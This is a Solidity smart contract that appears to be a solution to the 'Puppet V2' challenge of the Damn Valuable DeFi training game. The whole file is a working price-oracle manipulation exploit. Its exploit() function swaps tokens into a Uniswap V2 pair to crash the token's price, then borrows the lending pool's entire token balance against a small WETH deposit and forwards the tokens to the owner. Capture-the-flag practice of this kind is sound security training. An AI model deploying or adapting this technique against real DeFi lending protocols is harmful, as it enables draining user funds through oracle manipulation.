// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

interface IPuppetV2Pool {
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
    function borrow(uint256 borrowAmount) external;
}

interface IWETH9 {
    function deposit() external payable;
    function balanceOf(address addr) external returns (uint256);
    function approve(address addr, uint256 amount) external;
}

contract PuppetV2Attacker {
    DamnValuableToken private immutable dvt;
    IPuppetV2Pool private immutable pool;
    IUniswapV2Pair private immutable pair;
    IUniswapV2Router02 private immutable router;
    IWETH9 private immutable weth;

    address private immutable owner;

    constructor(address _dvt, address _pool, address _pair, address _router, address _weth) {
        dvt = DamnValuableToken(_dvt);
        pool = IPuppetV2Pool(_pool);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        weth = IWETH9(_weth);

        owner = msg.sender;
    }

    function exploit() external payable {
        require(msg.sender == owner, "nope");

        uint256 initialTokens = dvt.balanceOf(owner) - 1 ether; 
        dvt.transferFrom(owner, address(this), initialTokens);

        dvt.approve(address(router), initialTokens);
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = router.WETH();
        router.swapExactTokensForETH(
            initialTokens, 0, path, address(this), block.timestamp
        );

        weth.deposit{value: address(this).balance}();
        uint256 amountToBorrow = dvt.balanceOf(address(pool));
        uint256 requiredWeth = pool.calculateDepositOfWETHRequired(amountToBorrow);
        require(weth.balanceOf(address(this)) >= requiredWeth, "oof");

        weth.approve(address(pool), requiredWeth);
        pool.borrow(amountToBorrow);
        dvt.transfer(owner, dvt.balanceOf(address(this)));
    }

    fallback() external payable {}
}